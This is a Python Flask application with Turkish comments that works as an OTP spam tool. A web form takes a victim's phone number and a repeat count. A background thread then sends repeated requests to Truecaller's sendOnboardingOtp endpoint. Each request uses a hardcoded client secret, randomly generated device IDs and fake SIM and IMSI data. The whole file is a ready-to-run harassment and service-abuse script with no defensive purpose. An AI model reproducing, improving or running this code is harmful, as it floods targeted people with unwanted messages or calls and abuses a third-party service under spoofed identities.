from flask import Flask, request, render_template, jsonify
import requests
import random
import hashlib
import time
import threading

app = Flask(__name__)

# Rastgele cihaz ID'si oluşturma
def generate_device_id():
    characters = '123456789'
    random_string = ''.join(random.choice(characters) for _ in range(10))
    md5_hashed = hashlib.md5(random_string.encode()).hexdigest()[:16]
    return md5_hashed

# HTTP isteklerinde kullanılacak başlıklar
headers = {
    'clientsecret': 'lvc22mp3l1sfv6ujg83rd17btt',
    'user-agent': 'Truecaller/12.34.8 (Android;8.1.2)',
    'accept-encoding': 'gzip',
    'content-type': 'application/json; charset=UTF-8',
    'Host': 'account-asia-south1.truecaller.com'
}

url = 'https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'

# Spam gönderme fonksiyonu
def send_spam(phone_number):
    device_id = generate_device_id()
    data = {
        "countryCode": "eg",
        "dialingCode": 20,
        "installationDetails": {
            "app": {
                "buildVersion": 8,
                "majorVersion": 12,
                "minorVersion": 34,
                "store": "GOOGLE_PLAY"
            },
            "device": {
                "deviceId": device_id,
                "language": "ar",
                "manufacturer": "Xiaomi",
                "mobileServices": ["GMS"],
                "model": "Redmi Note 8A Prime",
                "osName": "Android",
                "osVersion": "7.1.2",
                "simSerials": ["8920022021714943876f", "8920022022805258505f"]
            },
            "language": "ar",
            "sims": [
                {"imsi": "602022207634386", "mcc": "602", "mnc": "2", "operator": "vodafone"},
                {"imsi": "602023133590849", "mcc": "602", "mnc": "2", "operator": "vodafone"}
            ],
            "storeVersion": {
                "buildVersion": 8,
                "majorVersion": 12,
                "minorVersion": 34
            }
        },
        "phoneNumber": phone_number,
        "region": "region-2",
        "sequenceNo": 1
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200:
            print('TAMAMLANDI.')
        else:
            print('Arama gönderilemedi. Hata kodu:', response.status_code)
            print('Yanıt içeriği:', response.text)
    except requests.exceptions.RequestException as e:
        print(f'Bir hata oluştu: {e}')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_spam', methods=['POST'])
def send_spam_route():
    phone_number = request.form.get('phone_number')
    spam_count = int(request.form.get('spam_count', 1))

    if not phone_number:
        return jsonify({'error': 'Telefon numarası gereklidir!'}), 400

    def spam_task():
        for _ in range(spam_count):
            send_spam(phone_number)
            time.sleep(5)

    thread = threading.Thread(target=spam_task)
    thread.start()

    return jsonify({'status': 'Spam gönderme işlemi başlatıldı.'}), 200

if __name__ == '__main__':
    app.run(debug=True)
